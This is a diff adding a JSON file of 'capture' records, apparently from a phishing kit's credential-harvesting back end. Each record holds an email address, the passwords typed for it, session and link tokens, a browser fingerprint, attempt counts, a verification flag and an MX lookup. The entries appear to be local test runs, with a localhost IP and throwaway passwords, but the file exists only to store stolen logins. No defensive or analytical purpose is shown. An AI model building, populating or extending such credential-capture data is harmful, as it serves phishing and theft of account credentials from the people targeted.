@@ -1,0 +1,104 @@
+{
+  "capture_1763112524541_s8gu2": {
+    "id": "capture_1763112524541_s8gu2",
+    "email": "paster@game.com",
+    "sessionIdentifier": "1763112201552_x6z2lgzfdm28",
+    "linkToken": "1763112201552_x6z2lgzfdm28",
+    "linkType": "generic",
+    "linkName": "GenericLink_1emails",
+    "fingerprint": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.",
+    "ip": "::1",
+    "passwords": [
+      "kjlkhjkj"
+    ],
+    "verified": false,
+    "provider": "Unknown",
+    "capturedAt": 1763112524542,
+    "attempts": 1,
+    "mxRecord": "mxbiz1.qq.com"
+  },
+  "capture_1763114269927_gmpsja": {
+    "id": "capture_1763114269927_gmpsja",
+    "email": "adarem@jwrinc.com",
+    "sessionIdentifier": "1763114071637_jehykb1qygsf",
+    "linkToken": "1763114071637_jehykb1qygsf",
+    "linkType": "generic",
+    "linkName": "GenericLink_1emails",
+    "fingerprint": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.",
+    "ip": "::1",
+    "passwords": [
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf"
+    ],
+    "verified": true,
+    "provider": "Confirmed",
+    "capturedAt": 1763114269927,
+    "attempts": 3,
+    "mxRecord": "Not available"
+  },
+  "capture_1763114295279_7sdsq": {
+    "id": "capture_1763114295279_7sdsq",
+    "email": "adarem@jwrinc.com",
+    "sessionIdentifier": "1763114071637_jehykb1qygsf",
+    "linkToken": "1763114071637_jehykb1qygsf",
+    "linkType": "generic",
+    "linkName": "GenericLink_1emails",
+    "fingerprint": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.",
+    "ip": "::1",
+    "passwords": [
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf"
+    ],
+    "verified": false,
+    "provider": "Unknown",
+    "capturedAt": 1763114295280,
+    "attempts": 1,
+    "mxRecord": "Not available"
+  },
+  "capture_1763114298760_snqb1": {
+    "id": "capture_1763114298760_snqb1",
+    "email": "adarem@jwrinc.com",
+    "sessionIdentifier": "1763114071637_jehykb1qygsf",
+    "linkToken": "1763114071637_jehykb1qygsf",
+    "linkType": "generic",
+    "linkName": "GenericLink_1emails",
+    "fingerprint": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.",
+    "ip": "::1",
+    "passwords": [
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf"
+    ],
+    "verified": false,
+    "provider": "Unknown",
+    "capturedAt": 1763114298761,
+    "attempts": 2,
+    "mxRecord": "Not available"
+  },
+  "capture_1763114375416_eu814q": {
+    "id": "capture_1763114375416_eu814q",
+    "email": "adarem@jwrinc.com",
+    "sessionIdentifier": "1763114071637_jehykb1qygsf",
+    "linkToken": "1763114071637_jehykb1qygsf",
+    "linkType": "generic",
+    "linkName": "GenericLink_1emails",
+    "fingerprint": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.",
+    "ip": "::1",
+    "passwords": [
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf",
+      "shvvkewf",
+      "javkaasc"
+    ],
+    "verified": false,
+    "provider": "Custom",
+    "capturedAt": 1763114404931,
+    "attempts": 5,
+    "mxRecord": "Not available"
+  }
+}
